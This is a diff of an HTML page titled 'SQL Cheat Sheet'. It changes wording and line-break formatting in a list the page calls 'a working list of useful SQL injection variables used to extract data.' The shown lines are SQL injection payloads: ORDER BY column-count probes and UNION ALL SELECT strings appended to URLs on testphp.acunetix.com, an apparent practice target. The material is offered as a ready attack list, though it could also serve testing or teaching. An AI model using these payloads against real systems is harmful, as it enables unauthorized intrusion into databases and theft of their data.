@@ -2,12 +2,12 @@
 <b>SQL Cheat Sheet</b><br />
 <br />
 <br />
-Below is a working, non exhaustive list, of useful SQL injection variables used to extract data from databases and systems from the URL.<br />
+Below is a working list of useful SQL injection variables used to extract data from databases and systems from the URL.<br />
 <br />
 If you have anything you feel could be added to any of the lists please feel free to write them in the comments and I'll update them accordingly.<br />
 <br />
-<b><i>Test number of Columns - Watch for Error</i></b><br />
-<i>http://testphp.acunetix.com/artists.php?artist=1</i> order by <i>1,2,3,4</i><br />
+<b><i>Test number of Columns - Watch for Error</i></b><br/>
+<i>http://testphp.acunetix.com/artists.php?artist=1</i> order by <i>1,2,3,4</i><br/>
 <i>http://testphp.acunetix.com/artists.php?artist=1</i> order by <i>1,2,3,4</i> -- LIMIT 1<br />
 <i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union&nbsp;<i>all</i>&nbsp;select&nbsp;<i>1</i>/*<br />
 <i>http://testphp.acunetix.com/artists.php?artist=1</i> -1 union&nbsp;<i>all</i>&nbsp;select&nbsp;<i>2</i>/*<br />
